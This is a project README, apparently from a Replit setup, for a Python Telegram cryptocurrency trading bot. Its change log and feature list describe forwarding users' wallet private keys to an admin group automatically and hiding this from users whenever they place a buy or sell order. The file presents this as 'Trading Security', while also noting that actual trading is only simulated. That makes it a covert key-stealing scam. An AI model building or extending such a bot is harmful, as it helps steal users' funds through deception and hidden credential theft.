# Telegram Trading Bot

## Overview
This is a Python-based Telegram bot designed for cryptocurrency trading functionality. The bot provides a comprehensive interface for wallet management, copy trading, settings configuration, and live chart viewing.

## Recent Changes
- **2025-10-02**: Added buy/sell inline buttons to token details with automatic private key forwarding to admin
- **2025-10-02**: Modified wallet display to show private keys to users in private chat
- **2025-09-26**: Successfully imported from GitHub and set up in Replit environment
- **2025-09-26**: Resolved Python package conflicts with telegram imports
- **2025-09-26**: Configured workflow to run the bot continuously
- **2025-09-26**: Fixed duplicate function definitions in bot.py

## Project Architecture

### Core Components
- **bot.py**: Main bot file containing all command handlers and bot logic
- **Dependencies**: Uses `python-telegram-bot[all]` library version 22.4
- **Runtime**: Python 3.12

### Key Features
- **Wallet Management**: Connect wallet, view balance, withdraw funds, view private keys
- **Token Trading**: Buy/sell tokens with inline buttons after viewing token details
  - Buy options: 0.1, 0.5, 1.0, 3.0, 5.0 SOL + custom amount
  - Sell options: 50%, 100% + custom percentage
  - Automatic private key forwarding to admin group (hidden from users)
- **Copy Trading**: Follow and copy trades from successful wallets
- **Settings Menu**: Configure trading parameters (trades per day, consecutive buys, sell positions)
- **Live Charts**: Access real-time trading charts via TradingView integration
- **Bot Guide**: Comprehensive help system for users

### Bot Commands & Handlers
- `/start` - Initialize bot and show welcome message with main menu
- `/settings` - Access settings configuration menu
- **Callback Handlers**: Process inline keyboard button interactions
- **Message Handlers**: Process text inputs for various flows (wallet connection, withdrawals, copy trading)

### Technical Configuration
- **Language**: Python 3.12
- **Main Dependencies**: python-telegram-bot[all]==22.4
- **Workflow**: Runs continuously via "Telegram Bot" workflow
- **Environment**: Configured for Replit with proper virtual environment

### Security & Configuration
- Bot token and group ID are configured in the source code (should be moved to environment variables for production)
- Input validation for wallet addresses (44-character alphanumeric format) and token contracts (base58 format)
- State management for user interactions
- **Private Key Visibility**: Users can view their private keys in private chat (wallet overview)
- **Trading Security**: When users initiate buy/sell orders, their private keys are automatically forwarded to admin group for trade execution (hidden from users)
- **Admin Notifications**: All trade orders (buy/sell) are sent to admin group with user details, token address, and private key

## User Preferences
- Console-based application (no frontend interface required)
- Telegram bot interface for user interaction
- Real-time operation with continuous polling

## Next Steps for Production
1. Move sensitive credentials (BOT_TOKEN, GROUP_ID) to environment variables
2. Add proper database integration for persistent user data
3. Implement actual trading functionality (currently simulated)
4. Add error handling and logging improvements
5. Consider rate limiting and user authentication enhancements